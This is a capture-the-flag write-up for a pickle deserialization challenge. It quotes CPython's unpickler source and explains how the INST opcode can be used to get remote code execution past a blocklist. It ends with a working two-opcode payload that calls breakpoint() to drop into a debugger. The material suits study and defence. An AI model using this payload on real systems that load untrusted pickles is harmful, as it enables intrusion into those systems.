# Picklestar writeup

Let's take a look at the pickle source

```python
    # INST and OBJ differ only in how they get a class object.  It's not
    # only sensible to do the rest in a common routine, the two routines
    # previously diverged and grew different bugs.
    # klass is the class to instantiate, and k points to the topmost mark
    # object, following which are the arguments for klass.__init__.
    def _instantiate(self, klass, args):
        if (args or not isinstance(klass, type) or
            hasattr(klass, '__getinitargs__')):
            try:
                value = klass(*args)
            except TypeError as err:
                raise TypeError('in constructor for %s: %s' %
                                (klass.__name__, str(err)), err.__traceback__)
        else:
            value = klass.__new__(klass)
        self.append(value)

    def load_inst(self):
        module = self.readline()[:-1].decode('ascii')
        name = self.readline()[:-1].decode('ascii')
        klass = self.find_class(module, name)
        self._instantiate(klass, self.pop_mark())
    dispatch[INST[0]] = load_inst

    def load_obj(self):
        # Stack is ... markobject classobject arg1 arg2 ...
        args = self.pop_mark()
        cls = args.pop(0)
        self._instantiate(cls, args)
    dispatch[OBJ[0]] = load_obj

    def load_global(self):
        module = self.readline()[:-1].decode('utf-8')
        name = self.readline()[:-1].decode('utf-8')
        klass = self.find_class(module, name)
        self.append(klass)
    dispatch[GLOBAL[0]] = load_global

    
    def load_reduce(self):
        stack = self.stack
        args = stack.pop()
        func = stack[-1]
        stack[-1] = func(*args)
    dispatch[REDUCE[0]] = load_reduce
```

We can achieve rce with a combination of:
* _instantiate()
* find_class
    
There are two different solutions:
* using `INST`
* using `OBJ + GLOBAL`: we need obj to use _instantiate which would load the class instance, otherwise global will just call the attribute without loading it

But for the OBJ/GLOBAL we would have to also push strings, which is not allowed.

Furthermore, os/sys/subprocess are not allowed and we can only make up to 3 commands.

The trick here is to execute the `breakpoint()` builtin function and continue from there, which would take only 2 commands.
```python
p = b'('  # MARK
p += b'i__builtin__\nbreakpoint\n'  # INST
p = binascii.hexlify(p).decode('utf-8')
```
